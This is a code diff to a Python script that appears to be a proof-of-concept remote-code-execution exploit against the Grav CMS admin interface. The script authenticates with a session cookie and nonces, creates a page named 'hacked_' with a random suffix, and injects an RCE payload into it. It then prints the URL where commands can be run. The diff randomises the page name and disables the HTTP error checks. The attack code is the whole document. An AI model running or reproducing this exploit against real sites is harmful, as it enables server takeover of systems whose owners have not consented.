@@ -28,6 +28,8 @@ import requests
 import re
 import argparse
 from urllib.parse import urlparse
+import string
+import random
 
 
 ##############################################
@@ -93,7 +95,8 @@ if session_cookie and login_nonce_match:
 
     # Send the login POST request
     login_response = requests.post(url_admin, data=post_data, headers=headers)
-    login_response.raise_for_status()
+    # Uncomment for Debug
+    #login_response.raise_for_status()
 
     # Check if the login response is a 303 redirect
     if login_response.status_code == 303:
@@ -108,8 +111,9 @@ if session_cookie and login_nonce_match:
 
         # Send the GET request to access the Grav console
         console_response = requests.get(url_admin, headers={"Cookie": new_session_cookie})
-        console_response.raise_for_status()
+        
         # Uncomment for Debug
+        #console_response.raise_for_status()
         #print(f"Console access response status: {console_response.status_code}")
         #print("Console access response data:")
         #print(console_response.text)
@@ -122,7 +126,8 @@ if session_cookie and login_nonce_match:
             #print(f"admin-nonce: {admin_nonce}")
 
             # Prepare the POST data for the next request
-            page_name = "hacked"
+            rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
+            page_name = "hacked_"+rand
             post_data = {
                 "data[title]": page_name,
                 "data[folder]": page_name,
@@ -136,7 +141,8 @@ if session_cookie and login_nonce_match:
 
             # Send the POST request to create the new page
             create_response = requests.post(url_admin, data=post_data, headers={"Cookie": new_session_cookie})
-            create_response.raise_for_status()
+            # Uncomment for Debug
+            #create_response.raise_for_status()
 
             # Check if the response to the create-new-page POST request is successful
             if (create_response.status_code == 303 or create_response.status_code == 200):
@@ -146,8 +152,9 @@ if session_cookie and login_nonce_match:
                 # Send the GET request to extract __unique_form_id__ and form-id values from response
                 url_new_page = url_admin+"/pages/"+page_name+"/:add"
                 new_page_response = requests.get(url_new_page, headers={"Cookie": new_session_cookie})
-                new_page_response.raise_for_status()
+                
                 # Uncomment for Debug
+                #new_page_response.raise_for_status()
                 #print(f"New-page response status: {new_page_response.status_code}")
                 #print("New-page response data:")
                 #print(new_page_response.text)
@@ -214,7 +221,8 @@ if session_cookie and login_nonce_match:
 
                     # Send the final POST request to inject the payload on the page previously created 
                     inj_response = requests.post(url_new_page, data=post_data, headers={"Cookie": new_session_cookie})
-                    inj_response.raise_for_status()
+                    # Uncomment for Debug
+                    #inj_response.raise_for_status()
 
                     # Check if the injection response is successful
                     if (inj_response.status_code == 303 or inj_response.status_code == 200):
@@ -224,13 +232,14 @@ if session_cookie and login_nonce_match:
                         # Check the updated page following the final redirection
                         final_location = url_admin+"/pages/"+page_name
                         final_redirect_response = requests.get(final_location, headers={"Cookie": new_session_cookie})
-                        final_redirect_response.raise_for_status()
+                        
                         # Uncomment for Debug
+                        #final_redirect_response.raise_for_status()
                         #print(f"Final redirect response status: {final_redirect_response.status_code}")
                         #print("Final redirect response data:")
                         #print(final_redirect_response.text)
 
-                        print("RCE payload injected, now visit the malicious page at: "+url+":"+str(port)+"/"+page_name+"?do=")
+                        print("RCE payload injected, now visit the malicious page at: '"+url+":"+str(port)+"/"+page_name+"?do=' and insert the command to run..")
                     else:
                         print("[E] Failed to inject the RCE payload, the injection response has not status 303 or 200...")
                 else:
